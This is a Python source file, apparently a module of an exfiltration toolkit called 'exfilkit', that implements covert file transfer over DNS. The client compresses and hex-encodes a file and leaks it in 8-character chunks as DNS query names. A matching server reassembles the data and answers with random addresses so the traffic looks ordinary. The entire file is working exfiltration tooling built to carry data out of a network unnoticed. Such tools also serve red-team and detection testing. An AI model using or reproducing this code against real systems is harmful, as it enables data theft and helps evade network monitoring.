import gzip
import random

from scapy.layers import dns

import exfilkit as lpz
from exfilkit import methods


EOT_RESPONSE = (b'cpanel.', '127.0.0.1')


class Server(methods.UDPServer):

    def __init__(self):
        super().__init__()
        self.msg_buffer = b''

    def random_ip(self):
        return '.'.join([str(random.randint(1, 250)) for i in range(4)])

    def dns_response(self, pkt, ip_address=None):
        if not ip_address:
            ip_address = self.random_ip()
        return bytes(dns.DNS(
            id=random.randint(0, 10000),
            qd=pkt[dns.DNS].qd,
            aa=1,
            qr=1,
            an=dns.DNSRR(rrname=pkt[dns.DNS].qd.qname, ttl=100, rdata=ip_address)
        ))

    def handle(self, request, client_address):
        data = self.receive(request)
        sock = request[1]
        pkt = dns.DNS(data)
        qname = pkt[dns.DNS].qd.qname
        if qname == EOT_RESPONSE[0]:
            msg = self.msg_buffer.replace(b'.', b'')
            dehexed = bytearray.fromhex(msg.decode('utf8'))
            decompressed = gzip.decompress(dehexed)
            self.output_write(decompressed)
            response = self.dns_response(pkt, EOT_RESPONSE[1])
        else:
            self.msg_buffer += qname
            response = self.dns_response(pkt)
        sock.sendto(response, client_address)


class Client(methods.UDPClient):

    CHUNK_SIZE = 8

    def execute(self):
        infile = self.args['infile'].read()
        hexed = gzip.compress(infile).hex()
        chunks = [hexed[i: i + self.CHUNK_SIZE] for i in range(0, len(hexed), self.CHUNK_SIZE)]
        lpz.logger.info('-> Sending DNS requests')
        for chunk in chunks:
            lpz.logger.debug(f'Sending "{chunk}"')
            query = dns.DNS(rd=1, qd=dns.DNSQR(qname=chunk))
            self.send(bytes(query))
        query = dns.DNS(rd=1, qd=dns.DNSQR(qname=EOT_RESPONSE[0]))
        self.send(bytes(query))
